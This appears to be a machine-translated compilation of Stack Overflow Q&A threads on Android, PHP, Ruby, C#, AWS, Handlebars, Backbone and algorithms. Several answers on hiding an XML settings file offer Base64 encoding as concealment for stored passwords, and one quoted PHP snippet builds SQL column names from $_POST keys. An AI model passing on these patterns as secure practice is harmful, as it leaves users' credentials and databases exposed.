## 回答 #2

> 赞同：0
> 
> 时间：2012-09-24T07:01:59.450

`GeoPoint`您可以计算一次转换前后的差异，并将其添加到`fromPixels`每次需要的结果中。

```
Projection projection = map.getProjection();
projection.toPixels(geoPointBefore, pt);
geoPointAfter = projection.fromPixels(pt.x, pt.y);

int diffLatitude  = geoPointBefore.getLatitudeE6()  - geoPointAfter.getLatitudeE6();
int diffLongitude = geoPointBefore.getLongitudeE6() - geoPointAfter.getLongitudeE6();
...
...
...
// Add the difference to GeoPoint objects after conversion `fromPixels` 
```

# android - 无需等待意图通知即可获取屏幕/手机的状态

> ID：11702563
> 
> 赞同：1
> 
> 时间：2012-07-28T16:04:50.780
> 
> 标签：android, android-intent

我创建了一些可以正常工作的意图过滤器，但是 - 我只被告知屏幕/手机在更改后处于什么状态。如何找到当前状态？这是我的过滤器 -

```
 receiver = new EventHandler();
    IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
    filter.addAction(Intent.ACTION_SCREEN_ON);
    filter.addAction(Intent.ACTION_SCREEN_OFF);
    filter.addAction(TelephonyManager.ACTION_PHONE_STATE_CHANGED); // for calls
    registerReceiver(receiver, filter); 
```

即使电池状态没有改变，我也会立即收到通知。如果其他意图触发这样的虚拟通知会很好。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T17:20:05.690

您只能立即获得电池状态的返回，因为`ACTION_BATTERY_CHANGED`它是一个`sticky`广播并且始终保持不变。

其他三个是一次性广播意图，仅在“动作”发生时发送。您将需要调用各种“管理器”类的方法来获得即时状态。

例如，`TelephonyManager`有一个`getCallState()`方法，`PowerManager`哪个有一个`isScreenOn()`方法。

我自己也没有尝试过，但文档建议它们可以满足您的需求。

看...

[电话经理](http://developer.android.com/reference/android/telephony/TelephonyManager.html)

[电源管理器](http://developer.android.com/reference/android/os/PowerManager.html)

# php - 存储数据库详细信息的最佳方法 php

> ID：11702571
> 
> 赞同：-1
> 
> 时间：2012-07-28T16:05:18.620
> 
> 标签：php, mysql

> **可能重复：**
> [mysql 密码使用 PHP 连接到 MySQL](https://stackoverflow.com/questions/11697928/mysql-passwords-connecting-to-mysql-with-php)

好的，所以现在每次我需要连接到我的 mysql 数据库时，我都必须硬编码所有参数，例如服务器、用户和密码，这意味着如果我更改数据库详细信息，我将不得不通过几十个脚本来更改此信息

我只是想知道是否有人可以通过解释如何制作一个更加动态的系统来连接到我的数据库来帮助我

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:06:54.357

一个超级简单的解决方案是将您的数据库详细信息存储在一个单独的配置文件中，您可以在其中为所有数据库连接详细信息定义变量。当您需要访问这些数据库详细信息并引用此配置文件中的变量而不是使用实际详细信息时，您只需包含此文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:11:25.757

是的，让连接参数像常量或定义一样，并像 Tomdarkness 所说的那样存储在 confing 中。

# ruby - 为什么我的 Sinatra 应用程序显示空白屏幕？

> ID：11702573
> 
> 赞同：1
> 
> 时间：2012-07-28T16:05:24.433
> 
> 标签：ruby, sinatra

几天前，我的 Sinatra 应用程序在我的本地服务器上运行，但现在它根本没有运行，我得到的只是一个空白屏幕。即使我部署到 Heroku，也没有任何效果。

这是一个 GitHub 存储库，您可以在其中查看我的代码：[https ://github.com/aayalur/Sinfoursq](https://github.com/aayalur/Sinfoursq)

我认为问题出在我的`config.ru`文件上。

```
# Gemfile
#require "rubygems"
#require "bundler/setup"
#require "sinatra"

require "./main"

set :run, false
set :raise_errors, true

run Sinatra::Application 
```

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T14:07:32.700

您的应用程序没有显示任何内容，因为您还没有关闭脚本标签。如果您检查 DOM，您会注意到这一点。

顺便说一句，您启动应用程序两次：一次在*main.rb*中，然后在*config.ru*中。
您会注意到，当您使用`Ctrl+C`该应用程序时：它会再次启动，您必须再次关闭它。

由于您的应用程序需要在 Rack 上运行，请去掉`Sinatra.run! if __FILE__ == $0`并使用 启动它`rackup`，如[Sinatra 的文档](http://www.sinatrarb.com/intro#Serving%20a%20Modular%20Application)中所述。

这将解决与运行应用程序相关的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T17:41:18.563

在您的 config.ru 中以这种方式离开：

```
require "rubygems"
require "bundler"

Bundler.require

require "./app"
run Sinatra::Application 
```

# php - Php 数组（很少）foreach 获取值

> ID：11702574
> 
> 赞同：1
> 
> 时间：2012-07-28T16:05:24.820
> 
> 标签：php, arrays

在 php 中做简单的 ftp 查看器：

我有一个函数，它返回带有文件名的数组。

我做了（在我的功能结束时）`print_r($files);`，这是输出

```
Array ( [0] => task_manager.zip [1] => 1086237 [2] => zip ) Array ( [0] => asd.zip [1] => 1086237 [2] => zip [3] => fonts/some_file.zip [4] => 959224 [5] => zip ) 
```

如您所见，我得到了数组，这是完美的，但是我想获取文件名，文件大小和文件扩展名，但失败了：

ps - `ListFiles`- 是我的函数名，`('fonts/')`- 我找到文件的文件夹

```
foreach (ListFiles('fonts/') as $key=>$file){
    echo 'file_name = '.$file."<br/>";
} 
```

我得到：

```
file_name = task_manager.zip
file_name = 1086237
file_name = zip
file_name = fonts/some_file.zip
file_name = 959224
file_name = zip 
```

这实际上是错误的，因为我想在一行中完成，如下所示：

我想要（接近完美的方式）做这样的事情：

在 php 中：

```
foreach (ListFiles('fonts/') as $key=>$file){
    echo 'file_name = '.$file[0].'file_size = '.$file[1].'file_ext = '.$file[2].'<br/>';
} 
```

在 html 中：

```
file_name = task_manager.zip, file_size = 1086237, file_ext = zip
file_name = some_file.zip, file_size = 959224, file_ext = zip 
```

更新：我的 ListFiles 函数

```
function ListFiles($dir) {
    if($dh = opendir($dir)) {

                //This data I get from form
        $allowedExts = array();
        if(isset($_POST['exts'])){
            for ( $i=0; $i < count($_POST['exts']); $i++ ){
                array_push($allowedExts, $_POST['exts'][$i]);
            }
        } // end of this data

        $files = Array();
        $inner_files = Array();
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.') {
                if(is_dir($dir . "/" . $file)) {
                    $inner_files = ListFiles($dir . "" . $file);
                    if(is_array($inner_files))
                        $files = array_merge($files, $inner_files); 
                } else {
                    if(in_array(end(explode('.', $file)), $allowedExts)){
                        $filesize = filesize('./'.$dir.$file);
                        $userfile_extn = substr($file, strrpos($file, '.')+1);
                        array_push($files, $dir . "/" . $file, $filesize, $userfile_extn);

                    }                
                }
            }
        }

        closedir($dh);
        return $files;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T12:18:17.510

最简单的方法：

```
$files = ListFiles('fonts/');
for ($i = 0; $i < count($files); $i += 3){
    echo 'file_name = '.$files[$i].'file_size = '.$files[$i+1].'file_ext = '.$files[$i+2].'<br/>';
} 
```

更好的方法：

[http://pastie.org/4567820](http://pastie.org/4567820)

# javascript - 无论如何要停止可折叠的侧面导航以停止在页面加载时跳转？

> ID：11702575
> 
> 赞同：1
> 
> 时间：2012-07-28T16:05:38.203
> 
> 标签：javascript, jquery

代码有效，只是每次我加载或刷新页面时它都会跳，我想知道是否有人知道一个好的解决方案？非常感谢任何帮助。

按这个[Jsfiddle](http://jsfiddle.net/DjbeK/)上的“运行”按钮，看看我的意思。

```
 <div id="sideNav_header">Navigation</div>

            <ul id="collapsibleMenu">
                <li><a href="#">Link</a>
                    <ul>

                        <li><a href="#">Link</a></li>
                        <li><a href="#">Link</a></li>
                        <li><a href="#">Link</a></li>
                        <li><a href="#">Link</a></li>
                        <li><a href="#">Link</a></li>

                    </ul>
                </li>
                <li><a href="#">Link</a>
                    <ul>
                        <li><a href="#">List Item 2.1</a></li>
                        <li><a href="#">List Item 2.2</a></li>
                        <li><a href="#">List Item 2.3</a></li>

                    </ul>
                </li>
                <li><a href="#">Link</a>
                    <ul>
                        <li><a href="#">List Item 3.1</a></li>
                        <li><a href="#">List Item 3.2</a></li>
                        <li><a href="#">List Item 3.3</a></li>

                    </ul>
                </li>
                <li><a href="#">Link</a>
                    <ul>
                        <li><a href="#">List Item 4.1</a></li>
                        <li><a href="#">List Item 4.2</a></li>
                        <li><a href="#">List Item 4.3</a></li>

                    </ul>
                </li>
                <li><a href="#">Link</a>
                    <ul>
                        <li><a href="#">List Item 5.1</a></li>
                        <li><a href="#">List Item 5.2</a></li>
                        <li><a href="#">List Item 5.3</a></li>

                    </ul>
                </li>
                <li><a href="#">Link</a>
                    <ul>
                        <li><a href="#">List Item 1.1</a></li>
                        <li><a href="#">List Item 1.2</a></li>
                        <li><a href="#">List Item 1.3</a></li>

                    </ul>
                </li>
                <li><a href="#">Link</a>
                    <ul>
                        <li><a href="#">List Item 2.1</a></li>
                        <li><a href="#">List Item 2.2</a></li>
                        <li><a href="#">List Item 2.3</a></li>

                    </ul>
                </li>
                <li><a href="#">Link</a>
                    <ul>
                        <li><a href="#">List Item 3.1</a></li>
                        <li><a href="#">List Item 3.2</a></li>
                        <li><a href="#">List Item 3.3</a></li>

                    </ul>
                </li>
                <li><a href="#">Link</a>
                    <ul>
                        <li><a href="#">List Item 4.1</a></li>
                        <li><a href="#">List Item 4.2</a></li>
                        <li><a href="#">List Item 4.3</a></li>

                    </ul>
                </li>
                <li><a href="#">Link</a>
                    <ul>
                        <li><a href="#">List Item 5.1</a></li>
                        <li><a href="#">List Item 5.2</a></li>
                        <li><a href="#">List Item 5.3</a></li>

                    </ul>
                </li>
                <li><a href="#">Link</a>
                    <ul>
                        <li><a href="#">List Item 5.1</a></li>
                        <li><a href="#">List Item 5.2</a></li>
                        <li><a href="#">List Item 5.3</a></li>

                    </ul>
                </li>
            </ul>

//Script//
     $("#collapsibleMenu > li > a").find("+ ul").slideUp(1);

                // Expand or collapse:
                $("#collapsibleMenu > li > a").click(function() {
                    $(this).find("+ ul").slideToggle("slow");
                });​ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T16:08:03.147

是的，改变：

```
$("#collapsibleMenu > li > a").find("+ ul").slideUp(1); 
```

至：

```
$("#collapsibleMenu > li > a").find("+ ul").slideUp(0); 
```

[http://jsfiddle.net/DjbeK/1/](http://jsfiddle.net/DjbeK/1/)

在页面加载时使用`slideUp(1)`没有意义，您可以`hide()`改用。

# algorithm - 最接近原点的二维坐标

> ID：11702579
> 
> 赞同：4
> 
> 时间：2012-07-28T16:06:44.787
> 
> 标签：algorithm, data-structures, performance

我正在查看以下面试问题：

> 给定 2d 坐标，找到离原点最近的 k 个点。提出一种存储点的数据结构和获取k个点的方法。还要指出代码的复杂性。

我想出的解决方案是将二维点保存在一个数组中。对于前k个点，找到每个点到原点的距离并建立一个最大堆。对于剩余的点，计算与原点的距离，比如 dist。如果 dist 大于堆的最顶部元素，则将堆的最顶部元素更改为 dist 并运行该`heapify()`过程。

这将需要`O(k)`构建堆和`O((n-k)log k)`过程`heapify()`，因此总复杂度 = `O(n log k)`.

任何人都可以提出**更好的数据结构**和/或方法，并且效率也可能更高吗？

编辑

其他一些数据结构在这里有用吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T16:35:10.067

您正在寻找的是[部分排序](http://en.wikipedia.org/wiki/Partial_sorting)。

我认为最好的方法是将所有内容放入未排序的数组中，然后使用修改后的就地快速排序，忽略索引完全高于或完全低于的分区`k`，并使用与原点的距离作为比较。

来自上面维基百科文章的伪代码：

```
function quickfindFirstK(list, left, right, k)
     if right > left
         select pivotIndex between left and right
         pivotNewIndex := partition(list, left, right, pivotIndex)
         if pivotNewIndex > left + k  // new condition
             quickfindFirstK(list, left, pivotNewIndex-1, k)
         if pivotNewIndex < left + k
             quickfindFirstK(list, pivotNewIndex+1, right, k+left-pivotNewIndex-1) 
```

执行后，这会将最小的`k`项目留在第一个`k`位置，但不按顺序排列。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T16:25:44.910

我会为此使用订单统计信息。
请注意，我们使用了一个`SELECT`使用与原点的距离作为比较函数的修改。

*   将元素存储在数组`A`中，第一个元素是`A[1]`，最后一个元素是`A[n]`。
*   运行`SELECT(A,1,n,k)`以找到`k`最接近原点的元素。
*   返回元素`A[1..k]`。

它的好处之一`SELECT`是对输入进行分区，以便将最小的`k-1`元素留给`A[k]`.

因此将元素存储在数组中是`O(n)`.
跑步`SELECT`是`O(n)`。
返回请求的元素是`O(1)`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-02-05T10:26:00.200

我使用所谓的“部分排序”为您编写了一个简单的版本 [http://tzutalin.blogspot.sg/2017/02/interview-type-questions-minqueue.html](http://tzutalin.blogspot.sg/2017/02/interview-type-questions-minqueue.html)

```
public static void main(String[] args) {
    Point[] points = new Point[7];
    points[0] = new Point(0, 0);
    points[1] = new Point(1, 7);
    points[2] = new Point(2, 2);
    points[3] = new Point(2, 2);
    points[4] = new Point(3, 2);
    points[5] = new Point(1, 4);
    points[6] = new Point(1, 1);
    int k = 3;
    qSelect(points, k - 1);
    for (int i = 0; i < k; i++) {
        System.out.println("" + points[i].x + "," + points[i].y);
    }
    // Output will be
    //        0,0
    //        1,1
    //        2,2
}

// in-place qselect and zero-based
static void qSelect(Point[] points, int k) {
    int l = 0;
    int h = points.length - 1;
    while (l <= h) {
        int partionInd = partition(l, h, points);
        if (partionInd == k) {
            return;
        } else if (partionInd < k) {
            l = partionInd + 1;
        } else {
            h = partionInd - 1;
        }
    }
}

static int partition(int l, int h, Point[] points) {
    // Random can be better
    // int p = l + new Random.nextInt(h - l + 1);
    int p = l + (h - l) / 2;
    int ind = l;
    swap(p, h, points);
    Point comparePoint = points[h];
    for (int i = l; i < h; i++) {
        if (points[i].getDistFromCenter() < comparePoint.getDistFromCenter()) {
            swap(i, ind, points);
            ind++;
        }
    }
    swap(ind, h, points);
    return ind;
}

static void swap(int i, int j, Point[] points) {
    Point temp = points[i];
    points[i] = points[j];
    points[j] = temp;
} 
```

# c# - 如何将数据保存在 xml 文件中并希望用户无法理解写入的内容

> ID：11702581
> 
> 赞同：1
> 
> 时间：2012-07-28T16:07:11.093
> 
> 标签：c#, xml, serialization

在我的项目中，我有 xml 文件来存储和检索`Device`对象，我希望用户只能通过我的应用程序而不是手动在我的 xml 文件中添加或删除，所以我需要以某种格式记录数据，用户无法理解它，例如 asp.net 中的 viewState`base64`或别的东西

**我的问题是如何将数据保存在 xml 文件中，但我希望用户无法理解所写的内容**

这是我的设备类

```
public class Device
    {
        public string Username { get; set; }
        public string AgentName { get; set; }
        public string Password { get; set; }
        public string Domain { get; set; }
        public string PeerURI { get; set; }
        public string SipURI { get; set; }
        public string FQDN { get; set; }
        public Enums.DeviceType Type { get; set; }
        public Enums.ServerTransportType TransportType { get; set; }
        public bool IsInitialized { get; set; }
    } 
```

这是我的 xml 文件

```
<?xml version="1.0" encoding="utf-8"?>
<settings>
  <username>foo</username>
  <AgentName>foo1</AgentName>
  <password>foo2</password>
  <domain>go</domain>
  <peerUri>140.242.250.200</peerUri>
  <sipUri>sip:xxx@xxxxx.com</sipUri>
  <fqdn>ff.go.xxxx.com</fqdn>
  <type>2</type>
  <transportType>2</transportType>
</settings> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:24:24.660

像这样的东西应该适用于 Base64 编码整个序列化过程......

```
using System.IO;
using System.Security.Cryptography;
using System.Xml.Serialization; 
```

...

```
private void WriteToFile(Device device, string filePath)
{
    using (FileStream fs = new FileStream(filePath, FileMode.Create))
    {
        using (CryptoStream cs = new CryptoStream(fs, new ToBase64Transform(), CryptoStreamMode.Write))
        {
            XmlSerializer x = new XmlSerializer(typeof(Device));
            x.Serialize(cs, device);
        }
    }
}

private Device ReadFromFile(string filePath)
{
    using (FileStream fs = new FileStream(filePath, FileMode.Open))
    {
        using (CryptoStream cs = new CryptoStream(fs, new FromBase64Transform(), CryptoStreamMode.Read))
        {
            XmlSerializer x = new XmlSerializer(typeof(Device));
            return x.Deserialize(cs) as Device;
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-28T16:10:55.413

Base64 应该可以。

```
String username = "foo";
byte[] EncodeAsBase64 = System.Text.ASCIIEncoding.ASCII.GetBytes(username);
string enc_username = System.Convert.ToBase64String(EncodeAsBase64); 
```

然后使用`serializer`来存储 enc_username。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T04:59:56.517

如果您不希望任何人能够使用文本编辑器编辑您的 XML 数据文件，则：

*   您不应该使用 XML，而应该将其保存为某种自定义二进制格式，或者
*   您应该使用[加密的 XML](http://msdn.microsoft.com/en-us/library/ms229746.aspx)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-28T16:49:58.107

如果您使用二进制序列化，则该文件根本不是人类可读的。

这是您的问题的一个简短示例：

```
public class Enums
{
    public enum DeviceType
    {
        Mouse,
        HardDisk,
        CdRom,
    }

    public enum ServerTransportType
    {
        Udp,
        Tcp,
    }
}

[Serializable]
public class Device
{
    public string Username { get; set; }
    public string AgentName { get; set; }
    public string Password { get; set; }
    public string Domain { get; set; }
    public string PeerURI { get; set; }
    public string SipURI { get; set; }
    public string FQDN { get; set; }
    public Enums.DeviceType Type { get; set; }
    public Enums.ServerTransportType TransportType { get; set; }
    public bool IsInitialized { get; set; }
}

public class BinarySerialize
{
    public void Test()
    {
        var device = new Device();

        device.Username = "userName";
        device.AgentName = "agentName";
        device.Password = "password";
        device.Domain = "domain";
        device.PeerURI = "peerURI";
        device.SipURI = "sipURI";
        device.FQDN = "fqdn";
        device.Type = Enums.DeviceType.HardDisk;
        device.TransportType = Enums.ServerTransportType.Tcp;
        device.IsInitialized = true;

        string fileName = @"C:\temp\device.bin";
        this.Serialize(device, fileName);

        var d = this.Deserialize(fileName);
    }

    public void Serialize(Device device, string fileName)
    {
        using (Stream stream = File.Open(fileName, FileMode.Create))
        {
            BinaryFormatter bformatter = new BinaryFormatter();
            bformatter.Serialize(stream, device);
            stream.Close();
        }
    }

    public Device Deserialize(string fileName)
    {
        var device = new Device();

        using (Stream stream = File.Open(fileName, FileMode.Open))
        {
            BinaryFormatter bformatter = new BinaryFormatter();
            device = (Device)bformatter.Deserialize(stream);
            stream.Close();
        }

        return device;
    } 
```

# amazon-web-services - 最大 AWS SQS 队列

> ID：11702582
> 
> 赞同：20
> 
> 时间：2012-07-28T16:07:20.410
> 
> 标签：amazon-web-services, amazon-sqs

有谁知道我可以创建的最大队列数量是多少？我在 AWS 上环顾四周，似乎找不到答案。在这个项目结束时，我可能有近 50 个不同的队列，并且想确保我没有跑出跑道......

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2013-01-16T20:19:50.173

队列的数量和队列中的消息数量没有限制。

[http://aws.amazon.com/sqs/faqs/#How_big_can_Amazon_SQS_queues_be](http://aws.amazon.com/sqs/faqs/#How_big_can_Amazon_SQS_queues_be)

您可以创建的队列数量没有限制：

> 问：我可以创建多少个消息队列？
> 
> 您可以创建任意数量的消息队列。

[https://aws.amazon.com/sqs/faqs/#Limits_and_restrictions](https://aws.amazon.com/sqs/faqs/#Limits_and_restrictions)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T22:05:28.273

I don't know of any limit. We're currently running about 45 queues and I'm sure we hit the 50 queue limit a while ago.

# javascript - 在 Awesomium 中，CallJavascriptFunction 可以解决 javascript 的冻结状态吗？

> ID：11702583
> 
> 赞同：1
> 
> 时间：2012-07-28T16:07:35.847
> 
> 标签：javascript, awesomium

我让两个线程同时调用 Javascript 的函数，其代码的第一个语句是一个警报语句，显示字符串“hello”和“world”。

我希望只有当我单击带有“hello”的警报时，才会显示警报“world”。但实际上警报“world”对话框将覆盖之前的“hello”对话框。

并且 alert("hello") 之后的代码根本没有执行。为什么会这样？

```
private void OnJSCallback(object sender, JSCallbackEventArgs e)
{
    //Console.WriteLine("hi");
    MessageBox.Show("hi");

    if (count == 0)
    {
        Thread worker = new Thread(func =>
            {
                Thread.Sleep(3000);
                OnReturn("CallFromNative1", "hello");
            });
        worker.Start();
    }

    if (count == 1)
    {
        Thread worker = new Thread(func =>
        {
            Thread.Sleep(3000);
            OnReturn("CallFromNative2", "world");
        });
        worker.Start();
    }
    count++;
}

private void OnReturn(string call, string ret)
{
    webControl.Dispatcher.BeginInvoke((ThreadStart) delegate()
    {
        Console.WriteLine("before call javascript");
        webControl.CallJavascriptFunction("", call, new JSValue[] { new JSValue(ret)});
    });
} 
```

JavaScript 代码是：

```
external.JSCallback("hello", "world");
external.JSCallback("wtf", "dude");
var count = 0;

function CallFromNative1()
{
alert(arguments[0]);
var i = 0;
count = 10;
alert(count);
for(i=0; i<1000; i++)
{
    count += i;
}
alert(count);
}

function CallFromNative2()
{
    alert(arguments[0]);
    alert(count);
} 
```

# mysql - Mysql数据库列约束错误

> ID：11702585
> 
> 赞同：0
> 
> 时间：2012-07-28T16:08:24.620
> 
> 标签：mysql

我有一个问题，如果我能得到一些帮助，我真的很乐意。我正在使用 php 应用程序与数据库进行交互。我有一个数据库，它运行良好。但是，当我备份它并将其移至另一台 PC 时，它开始起作用。它与原版相同。我有一个名为 的表`Authorize`，以及`authorized`一个默认不为空的列，但是当我尝试更新授权列时，出现以下消息（在原始系统上它仍然可以正常工作，我似乎找不到问题）。

```
Error: Column 'authorized' cannot be null
sql: update `authorized` set `authorized` = :authorized where `authorized_id` = :identity_id;

arr_sql_param: Array
(
[:identity_id] => 22
[:authorized] => 
)

Sent From: update_grid() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-29T10:52:53.630

阅读您的代码：

```
public function sql_update() {
    ...
    // make sql statement from key and values in $_POST data
    foreach($_POST as $key => $val) {
        $sql_set .= "`$key` = :$key, "; 
        $sql_param[":$key"] = $this->cast_value($val, $key);
    ...
    // posted values are saved here for pdo execute
    $sql_param = array();
    $sql_param[':identity_id'] = $identity_id;
    ...
    $sql_final = "update `$this->table` set $sql_set where `$this->identity_name` = :identity_id;";
    ... 
```

和错误：

> 错误：列 'authorized' 不能为空
> sql：更新`authorized`集`authorized`= :authorized where `authorized_id`= :identity_id;

我意识到确实`:authorized`没有明确设置或包含在 SQL 语句中。

这导致了两个可能的结论：

1.  如果在此环境中列不能为 NULL，但相同的代码在您的开发系统（您的 PC）上工作正常，那么这两个系统上的数据库方案可能不同。

    在新环境中，表中的`authorized`列`authorized`是定义的`NOT NULL`，而在您的开发环境中，您没有此约束。

    比较`SHOW CREATE TABLE authorized`两个系统，看看这是否属实。

2.  因为 for 的列值`authorized`来自`$_POST`数组..是否有可能由于某种原因浏览器没有发布它？但是，在您的代码中找不到原因。

# emacs - 如何在 cedet/ede 中激活和修改构建配置？

> ID：11702589
> 
> 赞同：1
> 
> 时间：2012-07-28T16:08:50.917
> 
> 标签：emacs, cedet

我基本上想知道如何关闭优化以便 gdb 正常工作。

当我从头开始设置 Automake 项目时，CPPFLAGS 的默认值似乎是“-g -O2”，但我只想要“-g”。有一个不相关的问题，答案显示 Project.ede 文件在此处为目标设置了 configuration-variables 字段：

[使用库设置 emacs EDE 项目](https://stackoverflow.com/questions/6480144/setting-up-an-emacs-ede-project-with-libraries?rq=1)

基于此，我编辑了我的目标以生成以下 Project.ede：

```
;; Object test3
;; EDE Project Files are auto generated: Do Not Edit
(ede-proj-project "test3"
  :file "Project.ede"
  :name "test3"
  :targets (list 
   (ede-proj-target-makefile-program "test3"
    :name "test3"
    :path ""
    :source '("main.cpp")
    :configuration-variables '(("debug" ("CPPFLAGS" . "-g")) ("release" ("CPPFLAGS" . "-O3")))
    :ldlibs '("boost_program_options" "boost_system")
    )
   )
  :makefile-type 'Makefile.am
  ) 
```

但是，在这些编辑之后执行 ede-compile-project 和 ede-compile-target 仍然会产生相同的“-g -O2”值。如何激活我创建的“调试”配置？另外，如何将其设置为新项目的默认配置集，这样我就不需要更改手动创建的每个新项目？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-29T07:22:06.613

您可以在项目设置中更改当前配置。

Mx customize-project，然后转到设置选项卡并更改当前配置值。

# html - 使表单中的字体更大

> ID：11702590
> 
> 赞同：0
> 
> 时间：2012-07-28T16:08:51.790
> 
> 标签：html, css, button, text

又是我和我的愚蠢问题。现在我得到了以下页面：

[http://jsfiddle.net/g3VBT/](http://jsfiddle.net/g3VBT/)

我想让“在此处输入您的 URL”文本具有以下属性：

**字体粗细：600；
字体大小：1.5em；**

问题是，如果我编辑字体大小，整个框看起来不对。有解决方案吗？
谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:16:42.713

如果你提高字体大小，宽度也会增加。将值减小到 eg20em 或更小，然后您可以将 font-size 设置为 1.5em。

如果您提出“这就是它的样子”和“它不应该看起来像这样”，就会更容易理解您的问题。

并且在哪个平台上看到这个提示也很有帮助......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:14:19.617

你说的错是什么意思？尝试减少填充。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:21:09.297

如果要增加字体大小，则还应更改填充和宽度。

# node.js - Handlebars 全部从数组中渲染

> ID：11702591
> 
> 赞同：1
> 
> 时间：2012-07-28T16:08:51.813
> 
> 标签：node.js, mongoose, handlebars.js

在我的 appjs 文件中，我试图按降序显示所有文章标题。这很好用，问题是猫鼬返回一个数组，我不知道如何在把手中写这个。

```
var bmtitles = BlogModel.find().select('title date').sort("date", -1);

bmtitles.execFind(function(err, ttles) {
    console.log(ttles);
            var model = {
                    layout:'blog.hbs',
                    BmTitles: ttles,
                };
    //render page
    res.render('blog', model);
}); 
```

我已经尝试过这样的事情，但没有奏效：

```
{{BmTitles.n.title}}
{{BmTitles.title}}
{{BmTitles}} 
```

这是 ttles 变量返回的内容（只有两个帖子用于测试）

```
[ { _id: 5011b563a947b943dc32d6f5,
    title: 'Blog title one',
    date: Sun Jan 01 2012 18:00:00 GMT-0600 (CST) },
  { _id: 5011c155a947b943dc32d6f6,
    title: 'secondpost',
    date: Sat Dec 31 2011 18:00:00 GMT-0600 (CST) } ] 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-28T18:49:24.757

你想[`#each`用来迭代](http://handlebarsjs.com/#iteration)你的数组：

> **块`each`助手**
> 
> 您可以使用内置`each`帮助程序遍历列表。在块内部，您可以使用`this`来引用被迭代的元素。

所以是这样的：

```
{{#each BmTitles}}
    <p>{{_id}}: {{title}}</p>
{{/each}} 
```

演示：http: [//jsfiddle.net/ambiguous/vZyHn/](http://jsfiddle.net/ambiguous/vZyHn/)

或者你可以用它[Mustache-style](http://mustache.github.com/mustache.5.html)：

> **部分**
> 
> 根据当前上下文中键的值，部分会渲染文本块一次或多次。
> 
> 一个部分以磅开头，以斜杠结尾。也就是说，`{{#person}}`开始一个“人”部分，同时`{{/person}}`结束它。

所以这也将起作用：

```
{{#BmTitles}}
    <p>{{_id}}: {{title}}</p>
{{/BmTitles}} 
```

演示：http: [//jsfiddle.net/ambiguous/qyE9b/](http://jsfiddle.net/ambiguous/qyE9b/)

# javascript - 主干表行视图，只有一个事件监听器？

> ID：11702592
> 
> 赞同：0
> 
> 时间：2012-07-28T16:09:07.063
> 
> 标签：javascript, jquery, backbone.js

基本上我想要做的是为我的 HTML 表的每一行创建一个 Backbone 视图，当我渲染我的表时我可以轻松地完成这个我为每个 tr 实例化一个主干视图，这将是视图的“el” .

但是，这会导致每个 tr 都有一个事件监听器，效率不高。有没有办法完成同样的事情，即让每个行视图的“el”成为 tr，但所有事件都从表元素委派，因此只有一个事件监听器存在？

也许有一个表的父视图并以某种方式委托所有事件，或者我真的不知道如何以一种好的方式解决这个问题，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-28T17:52:26.473

正常的方法是使用 a`TableView`和多个`RowView`s。TableView 将与 a 相关联，`Collection`并且它将`RowView`根据需要在此 Collection 上迭代实例化尽可能多的 s。

如果 Collection 发生变化，TableView 还将监听 Co​​llection 中的更改并创建和删除 RowView 实例。

RowView 将监听 Co​​llection 中每个`Model`s 的变化。并通过与每个模型关联的活动 DOM 元素*监听*用户交互。

我看不出这有什么问题。而且我认为是最直观、可维护和优雅的结构。

如果你真的认为让 TableView 一次监听所有行中的事件更好，这不是问题，试试这个：

```
var TableView = Backbone.View.extend({
  events: {
    "click tr a.remove", "remove"
  },

  remove: function( event ){
    console.log( "row-id", $(event.target).attr( "data-row-id" ) );
  }
}); 
```

只需确保`row`TableView 可以通过`data-row-id`示例中的任何特殊属性识别每个属性。但是当您直接在 RowView 中直接使用此事件时，您必须转到 Collection，搜索具体的模型并采取行动访问模型，一切工作更自然。

实际上，我认为您不会获得更好的性能，我认为底层 jQuery 将创建相同数量的事件侦听器。

# forms - atk4.2表单提交-如何在插入前获取新记录id以传入参数

> ID：11702593
> 
> 赞同：1
> 
> 时间：2012-07-28T16:09:13.823
> 
> 标签：forms, function, save, submit, atk4

我引用了[http://agiletoolkit.org/codepad/newsletter](http://agiletoolkit.org/codepad/newsletter)上的 2 步时事通讯示例。我将示例修改为 4 步过程。以下页面类是第 1 步，它用于插入新记录并获取新记录 ID。问题是我不想在最后一步之前将此记录插入数据库。我不确定如何在不使用 save() 函数的情况下检索此 ID。任何想法都会有所帮助。

```
class page_Ssp_Step1 extends Page {
    function init(){
        parent::init();

        $p=$this;

        $m=$p->add(Model_Publishers);
        $form=$p->add('Form');
        $form->setModel($m);
        $form->addSubmit();
        if($form->isSubmitted()){

        $m->save();//inserts new record into db.
        $new_id=$m->get('id');//gets id of new record
        $this->api->memorize('new_id',$new_id);//carries id across pages
        $this->js()->atk4_load($this->api->url('./Step2'))->execute();
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T20:35:40.373

